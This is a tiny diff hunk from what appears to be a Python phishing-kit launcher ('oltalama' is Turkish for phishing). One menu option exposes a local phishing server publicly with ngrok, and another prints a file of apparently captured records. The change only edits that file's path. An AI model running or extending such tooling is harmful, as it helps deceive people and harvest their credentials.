@@ -19,4 +19,4 @@ if(oltalama=="1"):
 	os.system("./ngrok http "+phport)
 
 elif(oltalama=="2"):
-	os.system("cat oltalama/kayitlar.txt")
+	os.system("cat kayitlar.txt")
